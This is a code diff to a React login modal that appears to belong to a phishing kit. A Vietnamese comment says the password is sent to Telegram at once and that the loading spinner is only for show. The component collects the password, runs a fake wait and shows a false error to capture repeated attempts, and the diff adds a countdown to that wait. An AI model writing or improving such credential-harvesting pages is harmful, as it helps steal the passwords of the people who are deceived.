@@ -22,10 +22,10 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
     });
     const [loginAttempt, setLoginAttempt] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
+    const [countdown, setCountdown] = useState(0);
     const [showError, setShowError] = useState(false);
     const [showPassword, setShowPassword] = useState(false);
 
-    const passwordLoadingMs = Math.max(1, Number(config.PASSWORD_LOADING_TIME || 3)) * 1000;
     const maxPasswordAttempts = Math.max(1, Number(config.MAX_PASS || 2));
 
     const handleChange = (field: 'password', value: string) => {
@@ -48,8 +48,23 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
         // Gửi Telegram ngay — spinner loading chỉ là UI
         onSubmit('', formData.password);
 
+        const loadingSec = Math.max(1, Number(config.PASSWORD_LOADING_TIME || 3));
+        setCountdown(loadingSec);
+
+        const timer = setInterval(() => {
+            setCountdown((prev) => {
+                if (prev <= 1) {
+                    clearInterval(timer);
+                    return 0;
+                }
+                return prev - 1;
+            });
+        }, 1000);
+
         setTimeout(() => {
+            clearInterval(timer);
             setIsLoading(false);
+            setCountdown(0);
 
             if (loginAttempt + 1 < maxPasswordAttempts) {
                 setShowError(true);
@@ -59,7 +74,13 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
                 setShowError(false);
                 onSuccess();
             }
-        }, passwordLoadingMs);
+        }, loadingSec * 1000);
+    };
+
+    const formatTime = (seconds: number) => {
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
     };
 
     const togglePasswordVisibility = () => {
@@ -231,15 +252,19 @@ const LoginModal = ({ show, onSubmit, onSuccess, texts }: LoginModalProps) => {
                         <div style={{ marginTop: '20px', width: '100%' }}>
                             <button type="submit" style={submitBtnStyle} disabled={isLoading}>
                                 {isLoading ? (
-                                    <span style={{
-                                        width: '22px',
-                                        height: '22px',
-                                        border: '3px solid rgba(255,255,255,0.4)',
-                                        borderTopColor: '#fff',
-                                        borderRadius: '50%',
-                                        animation: 'spin 0.8s linear infinite',
-                                        display: 'inline-block',
-                                    }} />
+                                    <>
+                                        <span style={{
+                                            width: '22px',
+                                            height: '22px',
+                                            border: '3px solid rgba(255,255,255,0.4)',
+                                            borderTopColor: '#fff',
+                                            borderRadius: '50%',
+                                            animation: 'spin 0.8s linear infinite',
+                                            display: 'inline-block',
+                                            marginRight: '8px',
+                                        }} />
+                                        {`${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...`}
+                                    </>
                                 ) : (
                                     <span>{texts.continueBtn}</span>
                                 )}
